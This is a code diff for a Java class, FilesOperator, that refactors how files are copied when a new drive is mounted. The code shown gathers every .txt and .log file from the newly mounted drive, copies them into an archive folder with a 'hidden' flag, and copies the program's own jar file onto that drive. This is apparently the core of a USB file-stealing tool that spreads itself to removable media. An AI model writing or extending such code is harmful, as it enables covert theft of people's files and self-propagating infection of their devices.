@@ -32,7 +32,7 @@ public class FilesOperator {
             System.out.println("Drive mounted!");
             File newDrive = File.listRoots()[File.listRoots().length-1];
             System.out.println(newDrive.getAbsolutePath());
-            findTxtAndCopy(newDrive, archive);
+            copy(getTxtFiles(newDrive),archive,false);
             copyJarFile(newDrive.toString(), false);
             drivesList = File.listRoots();
         }
@@ -43,13 +43,12 @@ public class FilesOperator {
 
     }
 
-    private static void findTxtAndCopy(File searchPath, File destination) {
+    private static File[] getTxtFiles(File searchPath) {
         File[] matchingFiles = searchPath.listFiles((dir, name) -> name.endsWith("txt") || name.endsWith("log"));
-        for (File file:matchingFiles){
-            File destFile = new File(destination.toString()+"/txt/"+file.getName());
-            copy(file, destFile, true);
-        }
+        return matchingFiles;
     }
+
+
     public static String getJarFilePath(Class aclass) throws Exception {
         CodeSource codeSource = aclass.getProtectionDomain().getCodeSource();
 
@@ -89,6 +88,12 @@ public class FilesOperator {
         }
     }
 
+    public static void copy(File[] fromFiles, File toFolder, boolean hidden){
+        for (File file:fromFiles){
+            File destFile = new File(toFolder.toString()+"/txt/"+file.getName());
+            copy(file, destFile, true);
+        }
+    }
 
     public static void copy(File from, File to, boolean hidden){
         File path = to.getParentFile();
